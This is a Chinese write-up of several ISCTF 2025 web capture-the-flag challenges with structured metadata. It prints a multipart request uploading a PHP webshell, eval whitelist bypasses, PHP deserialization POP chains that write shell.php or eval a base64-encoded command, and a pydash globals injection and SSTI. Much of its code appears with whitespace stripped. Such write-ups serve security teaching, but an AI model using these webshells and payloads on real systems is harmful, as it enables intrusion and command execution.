---
title: ISCTF 2025 部分 Web 题
contest: ISCTF
year: 2025
difficulty: medium
vuln_type: web_unknown
tags:
- 文件上传
- webshell
- PHP 反序列化
- Flask pydash
- SSTI
attack_chain: '|'
key_payload: '|'
one_liner: ISCTF 2025 8 道 Web (文件上传/eval bypass/SQL 注入/PHP 反序列化/Flask pydash/SSTI) 多题型速查。
lesson: '|'
quality: medium
full_path: ISCTF2025_部分web.full.md
meta_path: ISCTF2025_部分web.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: ISCTF 2025 部分 Web 题。ISCTF 2025 8 道 Web (文件上传/eval bypass/SQL 注入/PHP 反序列化/Flask pydash/SSTI) 多题型速查。。经验：|
category: web
subcategory: web_other
tools_used:
- Flask
- PHP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/286532.html
wp_author: n0t1ce
reasoning_chain:
- b@by n0t1ce b0ard：registration.php 接受 multipart 文件 → 触发点：文件上传
- '假设：未过滤后缀 → 动作：filename=basic_webshell.php + Content-Type: application/octet-stream 上传 → 观察：成功'
- 动作：访问 /uploads/basic_webshell.php?attack=phpinfo() → 完成
- eval bypass：preg_match /^[A-Za-z()_;]+$/ 严格白名单 → 触发点：纯白名单 eval
- 假设：只能字母+符号 → 动作：用 chr() / 取反 `$_GET[0]()` → 观察：可绕
- PHP 反序列化：源码暴露 ShitMountant(url=file:///) + FileLogger(logfile=, content=) → 触发点：POP 链
- 假设：构造 ShitMountant → FileLogger 写文件 → 动作：O:12:"ShitMountant":2:{s:3:"url";s:12:"file:///flag";s:6:"logger";N;} → 观察：失败
- 动作：换 O:10:"FileLogger" 写 /var/www/html/shell.php → 完成
- Flask pydash：pydash.set_(globals()[username], password, confirm_password) → 触发点：globals 注入
- 假设：username=name, password=isAdmin, confirm_password=true → 动作：URL 参数 → 观察：覆盖 isAdmin
- SSTI impression：render_template(point) 接受 5 字符以内 → 假设：lipsum 链
- 动作：point = lipsum|attr(...)+... → 完成
failed_attempts:
- 试图直接传 PHP webshell → 失败：必须 multipart 包装
- ShitMountant 类尝试读文件 → 失败：url 是 file:/// 但写权限不够
- pydash 试图覆盖 password 变量 → 失败：必须传 isAdmin
key_observations:
- 文件上传漏洞的核心是 Content-Type 欺骗 + 后缀过滤绕过
- PHP 白名单 eval 用 chr / 反引号 / GET 参数动态函数
- Flask + pydash.set_ 是 Python CTF 的 RCE 神器
- Jinja2 lipsum().__globals__ 是 SSTI 短 payload 通用解
- PHP 反序列化 POP 链靠魔术方法（__destruct/__toString）串接
prerequisites:
- 'PHP 文件上传 multipart 协议 + 序列化协议（O: / s:）'
- Flask 模板与全局变量
- Jinja2 SSTI gadget 链（lipsum / cycler / joiner）
- pydash.set_ 用法
---
# ISCTF2025 部分web

> 原文: https://www.ctfiot.com/286532.html
> ID: 286532

b@by n0t1ce b0ard

在http://challenge.bluesharkinfo.com:
20796/registration.php 传入php文件

POST /registration.php HTTP/1.1Host: challenge.bluesharkinfo.com:
20796Content-Length: 1167Cache-Control: max-age=0Accept-Language: zh-CN,zh;q=0.9Origin: http://challenge.bluesharkinfo.com:
20796Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryh9UWemEvKSJP11UPUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://challenge.bluesharkinfo.com:
20796/registration.phpAccept-Encoding: gzip, deflate, brCookie: PHPSESSID=3ce539671e19b6fb4c984e0f0581a917Connection: keep-alive------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="n"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="e"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="p"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="mob"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="gen"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="hob[]"reading------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="img"; filename="basic_webshell.php"Content-Type: application/octet-stream<?php @eval($_GET['attack']);?>------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="yy"1951------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="mm"2------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="dd"3------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="save"Save------WebKitFormBoundaryh9UWemEvKSJP11UP--

访问 url/images/test/basic_webshell.php?attack=system(%22cat%20/flag%22);

ezrce

<?phphighlight_file(__FILE__);if(isset($_GET['code'])){ $code=$_GET['code']; if(preg_match('/^[A-Za-z()_;]+$/',$code)) { eval($code); }else{ die('师傅，你想拿flag？'); }}

?code=eval(end(current(get_defined_vars())));&b=system("cat%20/flag");

flag到底在哪

username=admin password=sql注入 跳转到upload

这个就上传 一句话木马就行

来签个到吧

漏洞点


```
POST /registration.php HTTP/1.1Host: challenge.bluesharkinfo.com:
20796Content-Length: 1167Cache-Control: max-age=0Accept-Language: zh-CN,zh;q=0.9Origin: http://challenge.bluesharkinfo.com:
20796Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryh9UWemEvKSJP11UPUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://challenge.bluesharkinfo.com:
20796/registration.phpAccept-Encoding: gzip, deflate, brCookie: PHPSESSID=3ce539671e19b6fb4c984e0f0581a917Connection: keep-alive------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="n"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="e"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="p"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="mob"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="gen"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="hob[]"reading------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="img"; filename="basic_webshell.php"Content-Type: application/octet-stream<?php @eval($_GET['attack']);?>------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="yy"1951------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="mm"2------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="dd"3------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="save"Save------WebKitFormBoundaryh9UWemEvKSJP11UP--
<?phphighlight_file(__FILE__);if(isset($_GET['code'])){ $code=$_GET['code']; if(preg_match('/^[A-Za-z()_;]+$/',$code)) { eval($code); }else{ die('师傅，你想拿flag？'); }}
blueshark:O:12:"ShitMountant":2:{s:3:"url";s:12:"file:///flag";s:6:"logger";N;}尝试读取文件发现不行，看看写入文件
blueshark:O:10:"FileLogger":2:{s:7:"logfile";s:25:"/var/www/html/shell.php";s:7:"content";s:28:"<?php system($_GET['c']); ?>";}
from flask import Flask,request,render_template,redirect,url_forimport jsonimport pydashapp=Flask(__name__)database={}data_index=0name=''@app.route('/',methods=['GET'])def index(): returnrender_template('login.html')@app.route('/register',methods=['GET'])def register(): returnrender_template('register.html')@app.route('/registerV2',methods=['POST'])def registerV2(): username=request.form['username'] password=request.form['password'] password2=request.form['password2'] ifpassword!=password2: return''' <script> alert('前后密码不一致，请确认后重新输入。'); window.location.href='/register'; </script> ''' else: global data_index data_index+=1 database[data_index]=username database[username]=password returnredirect(url_for('index'))@app.route('/user_dashboard',methods=['GET'])def user_dashboard(): returnrender_template('dashboard.html')@app.route('/272e1739b89da32e983970ece1a086bd',methods=['GET'])def A272e1739b89da32e983970ece1a086bd(): returnrender_template('admin.html')@app.route('/operate',methods=['GET'])def operate(): username=request.args.get('username') password=request.args.get('password') confirm_password=request.args.get('confirm_password') ifusernameinglobals() and"old"notinpassword: Username=globals()[username] try: pydash.set_(Username,password,confirm_password) return"oprate success" 
except: return"oprate failed" else: return"oprate failed"@app.route('/user/name',methods=['POST'])def name(): return{'username':
user}deflogout(): returnredirect(url_for('index'))@app.route('/reset',methods=['POST'])def reset(): old_password=request.form['old_password'] new_password=request.form['new_password'] ifuserindatabase and database[user] == old_password: database[user]=new_password return''' <script> alert('密码修改成功，请重新登录。'); window.location.href='/'; </script> ''' else: return''' <script> alert('密码修改失败，请确认旧密码是否正确。'); window.location.href='/user_dashboard'; </script> '''@app.route('/impression',methods=['GET'])def impression(): point=request.args.get('point') iflen(point) > 5: return"Invalid request" List=["{","}",".","%","<",">","_"] foriinpoint: ifiinList: return"Invalid request" returnrender_template(point)@app.route('/login',methods=['POST'])def login(): username=request.form['username'] password=request.form['password'] type=request.form['type'] ifusernameindatabase and database[username] != password: return''' <script> alert('用户名或密码错误请重新输入。'); window.location.href='/'; </script> ''' elifusername notindatabase: return''' <script> alert('用户名或密码错误请重新输入。'); window.location.href='/'; </script> ''' else: global name name=username ifint(type)==1: returnredirect(url_for('user_dashboard')) elifint(type)==0: returnredirect(url_for('A272e1739b89da32e983970ece1a086bd'))if__name__=='__main__': app.run(host='0.0.0.0',port=8080,debug=False)
@app.route('/operate',methods=['GET'])def operate(): username=request.args.get('username') password=request.args.get('password') confirm_password=request.args.get('confirm_password') ifusernameinglobals() and"old"notinpassword: Username=globals()[username] try: pydash.set_(Username,password,confirm_password) return"oprate success" 
except: return"oprate failed" else: return"oprate failed"
@app.route('/impression',methods=['GET'])def impression(): point=request.args.get('point') iflen(point) > 5: return"Invalid request" List=["{","}",".","%","<",">","_"] foriinpoint: ifiinList: return"Invalid request" returnrender_template(point)
<?phperror_reporting(0);class begin { public$var1; public$var2; function__construct($a) { $this->var1 =$a; } function__destruct() { echo$this->var1; } publicfunction__toString() { $newFunc=$this->var2; return$newFunc(); }}class starlord { public$var4; public$var5; public$arg1; publicfunction__call($arg1,$arg2) { $function=$this->var4; return$function(); } publicfunction__get($arg1) { $this->var5->ll2('b2'); }}class anna { public$var6; public$var7; publicfunction__toString() { $long= @$this->var6->add(); return$long; } publicfunction__set($arg1,$arg2) { if($this->var7->tt2) { echo"yamada yamada"; } }}class eenndd { public$command; publicfunction__get($arg1) { if(preg_match("/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i",$this->command)){ echo"nonono"; }else{ eval($this->command); } }}class flaag { public$var10; public$var11="1145141919810"; publicfunction__invoke() { if(md5(md5($this->var11)) == 666) { return$this->var10->hey; } }}if(isset($_POST['ISCTF'])) { unserialize($_POST["ISCTF"]);}else{ highlight_file(__FILE__);}
<?php
class begin { public$var1; public$var2; function__construct($a,$b) { $this->var1 =$a; $this->var2 =$b; }}class flaag { public$var10; public$var11;}class eenndd { public$command;}// 第一步：爆破md5(md5($x)) == 666的值// 弱类型比较，只需要md5(md5($x))以"666"开头// 可以通过爆破找到这样的值$found=false;$value="";for($i= 0;$i< 100000000;$i++) { $hash= md5(md5((string)$i)); if(substr($hash, 0, 3) ==="666") { $value= (string)$i; echo"Found:$value->$hashn"; $found=true; break; }}if(!$found) { // 如果没找到，可以使用字符串"1145141919810"的md5 // 先看看这个默认值 $hash1= md5("1145141919810"); $hash2= md5($hash1); echo"Default var11 hash:$hash2n";}// 第二步：构造对象链// 创建eenndd对象（最终执行命令）$end= new eenndd();// 需要绕过命令过滤，使用eval执行命令// 方法1：使用字符串拼接绕过过滤$end->command='$a=eval(base64_decode("c3lzdGVtKCJjYXQgL2ZsYWciKTs="));';// 方法2：使用反引号执行命令（但需要绕过空格过滤）//$end->command='echo `ls${IFS}/`;';// 方法3：使用exec或passthru（如果没被过滤）//$end->command='passthru("ls /");';// 创建flaag对象$flag= new flaag();$flag->var10 =$end; // 访问hey属性会触发eenndd::
__get()$flag->var11 =$value?$value:"1145141919810";// 创建begin对象$beg= new begin($beg,$flag); // var1指向自己，var2指向flaag对象$beg->var1 =$beg; // 这样echo$this->var1会触发自身的__toString()$beg->var2 =$flag; // __toString()会调用var2()echo"序列化payload:n";echourlencode(serialize($beg));echo"nn";echo"begin对象: ". serialize($beg) ."n";
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]